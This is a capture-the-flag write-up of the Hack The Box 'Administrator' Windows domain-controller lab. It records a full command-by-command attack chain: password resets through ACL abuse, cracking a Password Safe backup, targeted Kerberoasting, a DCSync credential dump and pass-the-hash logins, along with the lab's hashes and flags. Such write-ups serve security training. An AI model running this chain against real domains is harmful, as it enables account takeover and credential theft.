---
title: Administrator 
date: 2026-08-13 00:00:00 +0800 
categories: [HTB, Box]
image:
    path: Administrator.png
layout: post
media_subpath: /assets/posts/administrator
---

# HTB Administrator - Medium

HTB Machine Medium by songsomi

As is common in real life Windows pentests, you will start the Administrator box with credentials for the following account: Username: Olivia Password: ichliebedich !!!


```terminal
Me > 10.10.14.74
Target > 10.129.43.32
```

## Foothold
```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nmap 10.129.43.32 -p- -sV -sC -v -oN nmap.txt

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-13 07:24:02Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
52647/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
52652/tcp open  msrpc         Microsoft Windows RPC
52663/tcp open  msrpc         Microsoft Windows RPC
52674/tcp open  msrpc         Microsoft Windows RPC
55978/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-08-13T07:24:53
|_  start_date: N/A
|_clock-skew: 6h59m40s
```

Its a domain controller. But there is a few things that stand out. First is port 21. FTP is not something you see often on windows machines. This is worth checking out.

We can use netexec to generate us the kerberos files and hosts file. This saves us some time and its a nice way to do it. We can also double check the files to see it generated correctly.
```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ sudo nxc smb 10.129.43.32 -u '' -p '' --generate-krb5-file /etc/krb5.conf
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [+] krb5 conf saved to: /etc/krb5.conf
SMB         10.129.43.32    445    DC               [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB         10.129.43.32    445    DC               [+] administrator.htb\: 

┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ sudo nxc smb 10.129.43.32 -u '' -p '' --generate-hosts-file /etc/hosts
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [+] administrator.htb\: 
```

The credentials we got from the start is a low privilege user. We also have access to LDAP. We can verify it via netexec aswell. We want to see what more we can do as 'Olivia' so running bloodhound is a good choice.

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator/bloodhound1]
└─$ nxc ldap 10.129.43.32 -u 'Olivia' -p 'ichliebedich'
LDAP        10.129.43.32    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) (signing:None) (channel binding:No TLS cert) 
LDAP        10.129.43.32    389    DC               [+] administrator.htb\Olivia:ichliebedich 

┌──(songbird㉿kali)-[~/Desktop/Administrator/bloodhound1]
└─$ bloodhound-python -d 'administrator.htb' -u 'Olivia' -p 'ichliebedich' -c All -ns 10.129.43.32
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: administrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.administrator.htb
INFO: Found 11 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.administrator.htb
INFO: Done in 00M 23S
```
When we review the bloodhound data, We see that Olivia has outbound object control (GenericAll) over 'Michael'. 

![Administrator](Administrator1.png)

### Michael

We can use alot of different methods over 'Michael' but im going to change the password. bloodyad makes this very easy, we can aswell verify that it work with netexec.

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ bloodyad --host 10.129.43.32 -d administrator.htb -u 'Olivia' -p 'ichliebedich' set password 'michael' 'MichaelP@ssword123!'
[+] Password changed successfully!

┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nxc smb 10.129.43.32 -u 'michael' -p 'MichaelP@ssword123!'
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [+] administrator.htb\michael:MichaelP@ssword123! 
```

Going back to the bloodhound data now as 'Michael', we see that we can ForceChangePassword over 'Benjamin'

![Administrator](Administrator2.png)

### Benjamin

Lets use bloodyad again to change passwords.

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ bloodyad --host 10.129.43.32 -d administrator.htb -u 'michael' -p 'MichaelP@ssword123!' set password 'benjamin' 'benjaminP@ssword123!'
[+] Password changed successfully!

┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nxc smb 10.129.43.32 -u 'benjamin' -p 'benjaminP@ssword123!'                                             
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [+] administrator.htb\benjamin:benjaminP@ssword123! 
```

It worked,we have control over benjamin. Remember the FTP service that was running. Lets test if we can log in as 'benjamin'

```terminal
┌──(songbird㉿kali)-[~]
└─$ ftp 10.129.43.32
Connected to 10.129.43.32.
220 Microsoft FTP Service
Name (10.129.43.32:songbird): benjamin
331 Password required
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||54246|)
125 Data connection already open; Transfer starting.
10-05-24  09:13AM                  952 Backup.psafe3
226 Transfer complete.
ftp> get Backup.psafe3
local: Backup.psafe3 remote: Backup.psafe3
229 Entering Extended Passive Mode (|||54248|)
125 Data connection already open; Transfer starting.
100% |******************************************************************************************************************************************|   952        7.92 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 3 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
952 bytes received in 00:00 (7.88 KiB/s)
```

It works and we have a Backup.psafe3 file.

### Emily

To be able to open the file, you can use [GitHub](https://github.com/pwsafe/pwsafe/releases?q=non-windows&expanded=true "pwsafe") and install the latest release.

When we open up the file we get prompted a password that we dont have. We can use John to crack it.

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ pwsafe2john Backup.psafe3 > backuphash

┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ john backuphash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 2048 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
tekieromucho     (Backu)     
1g 0:00:00:00 DONE (2026-08-12 21:20) 2.941g/s 18070p/s 18070c/s 18070C/s newzealand..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```
We get the password 'tekieromucho'. We can log into the backup database.

```terminal
alexander UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
emily UXLCI5iETUsIBoFVTj8yQFKoHjXmb
emma WwANQWnmJnGV07WQN8bMS7FMAbjNur
```

lets try our luck with the new credentials. 

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nxc smb 10.129.43.32 -u 'alexander' -p 'UrkIbagoxMyUGw0aPlj9B0AXSea4Sw'
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [-] administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 

┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nxc smb 10.129.43.32 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'     
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb 

┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nxc smb 10.129.43.32 -u 'emma' -p 'WwANQWnmJnGV07WQN8bMS7FMAbjNur' 
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [-] administrator.htb\emma:WwANQWnmJnGV07WQN8bMS7FMAbjNur STATUS_LOGON_FAILURE
```

the only user with the right credentials was 'Emily'. If we look at the bloodhound data again, we see 2 things. 1 Emily is in the 'REMOTE MANAGEMENT USERS' So we can winrm in. It does say (Pwn3d!) but we are not done yet. We also have outbound control over 'Ethan'

## User

```terminal
┌──(songbird㉿kali)-[~/Desktop]
└─$ nxc winrm 10.129.43.32 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
WINRM       10.129.43.32    5985   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:administrator.htb) 
WINRM       10.129.43.32    5985   DC               [+] administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb (Pwn3d!)


┌──(songbird㉿kali)-[~/Desktop]
└─$ evil-winrm -i 10.129.43.32 -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\emily\Documents> cd ..
*Evil-WinRM* PS C:\Users\emily> cd Desktop
*Evil-WinRM* PS C:\Users\emily\Desktop> type user.txt
90c942135e5ab277d88867a403f8f57d
*Evil-WinRM* PS C:\Users\emily\Desktop>
```

We can grab the user flag here.

### Ethan

Back to the outbound control that Emily has. It is GenericWrite over ethan. A TargetedKerberoast attack is being suggested in bloodhound.  [GitHub](https://github.com/ShutdownRepo/targetedKerberoast "TargtedKerberoast")

![Administrator](Administrator3.png)

After downloading the script on my attacker machine, im going to use uv to run the script as it does not affect my orther tools due to python packages. Remember to sync your time with the machine.

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator/targetedKerberoast]
└─$ sudo rdate -n 10.129.43.32
Thu Aug 13 04:38:59 EDT 2026

┌──(songbird㉿kali)-[~/Desktop/Administrator/targetedKerberoast]
└─$ uv run targetedKerberoast.py -d 'administrator.htb' -u 'emily' -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ethan)
$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$42d96ea93242314d941d18732f958a67$f4f271c2f41b3ed753af4e26e815f9ac8e134de5a46b9d20c4fce4b6b5784c70dce5353fbfd4228824c002096ae7d266bb03c34a6abf0ea0b342bbc214d532d66896620a770180957c5fa5dba14616c5372ebb51361052f41de0b6663afafba198ff7f22618152911a57ed7bf9191c9dc2894f38547c4a20936afc02a17cda7b44364fea19dd6535f5d1ccea7dc6d7c6b0702dc0b69d8ed6627cfda8ce1293daf23cf827f76732ac110f4c20887aaedb81452aeebce085316deffa8a40f60ea9f50d14c165ecc894f479e76e57780789ab1a724464369dae3e3e9b883929adde7356db4588af79ca6c2899576e9b79b94d13fb0db8c72d379880cca80719b12a9ce255848c51cc7af8e18dfc5848ca37fd514133000a17e0e9819114f78a61c65b4bfc7340cbb178d5ae7bcde7dd34d2a37c10e31e81e8cc9009e71c0fda2fc3487394cfc227508a2c603525fd20bf331effa4d916c048fe55079ba69a115e0d1d93dd206d9c4d14725f52fa8ef28b0113dc94f989a8b44e9066f4b9755643b284c7553d2e343014f32a437514a0f459b4cfb82638a381a95d8d1c1fcf055ca8d8cdd27fcc1d3d238c265e4ff443c613c47fb1b07e5b492885ec4423b75fb67f7ec480bfa4557c342470961126999fea69e6988ecff72e9f8f0f1a2d5dc09d6ec073430cb9e890322336f67b0e1ab7c4c187bbec4170759986a26b6154c20f5845afd38d2e0ba378e34e9ce31d9e47d367b162772dfe4db6b04311107f0fdf2eeff4558d3023d9e14cd6909312e1e12a584c47c9e7fa427118fbad849dfea3de0007b4b59a3fded6edc1371a04b5ddb9172104fa12f97af2fa16966b5c6e4fd61bad7148f67f18eadcd1a30bdd22b18b350cdc1589308a141198204b0bbcc834cf301bb413e5a77fba6571c9e91cd204d2c02d45cc8aeb711db154bc69fbb6999d56cfb5608d883d7afb0ca6ded6716947045cd87fef7365b618a8209d567b72348014e442992d218898494ef08ce5cc251aead06062eb91505a9c35738c8bbe8158fa371f18ab5ba581f8e0d99785d99008068806beeb2fcb80de2baf7095e924fd13fcc256da8bae1ae0adfa222b779b39ab495c30cc80fdcca9b174bf53d0b4c7fb3d46d6834b1a59a34e23ec73d919a1c6c68713c063a3e47208eb61d95963c3f588e4f7690e61b6d9f5adc79748c307efb3aa13f76e5f3736347bdfb49b75983b9dc2ec5cc9716abcdf2eecf6b077a6b8b11873b70c00971a2c98e76cf522b5dc01c5cd96b166327be96e01d5f9f58afe03e4d99f2ea230498c28fdbc0453ac22ebf55128adc5e3c4ff9517c5521d2b35478e97e59469d1e95580794981483bb54ffd575f549fb0b316e6f6105f5e513b54170025a8a51c93dab8ccbdffb71df0253e2a7b1ed4086296eea7b1423fa8081a0539958157ecb7450218643827cbfed6212865e7fb488013accc3e4065a00302b5bcbcdc2af7409967e400a912b4c7125f0cc32ff62f8cb686ec72a75a8a9f4fba32d610e3c2503f51ab62
```

Common errors messages are for example

'KRB_AP_ERR_SKEW (Clock skew too great)'

It could be caused by something on your machine that resets the time, or by VirtualBox (the host computer), for example."

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ john ethanhash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
limpbizkit       (?)     
1g 0:00:00:00 DONE (2026-08-12 21:42) 50.00g/s 256000p/s 256000c/s 256000C/s Liverpool..babygrl
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nxc smb 10.129.43.32 -u 'ethan' -p 'limpbizkit'
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [+] administrator.htb\ethan:limpbizkit 
```

## Administrator

Going back to the bloodhound data, we see something. Ethan has DCSync over the 'administrator.htb' domain. If we look also what bloodhound suggests we get secretsdump.

![Administrator](Administrator4.png)

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ impacket-secretsdump ethan:limpbizkit@10.129.43.32                  
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::
<REDACTED>
```

We get the Administrator hash. If we try it it succeeds.

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ nxc smb 10.129.43.32 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
SMB         10.129.43.32    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.32    445    DC               [+] administrator.htb\Administrator:3dc553ce4b9fd20bd016e098d2d2fd2e (Pwn3d!)
```

![Administrator](Administrator5.png)

Lets get the root flag.

```terminal
┌──(songbird㉿kali)-[~/Desktop/Administrator]
└─$ evil-winrm -i 10.129.43.32 -u 'Administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
*Evil-WinRM* PS C:\Users\Administrator> cd Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4e6c2e97baf38aa3e257f3f42211de18
```

Pwned!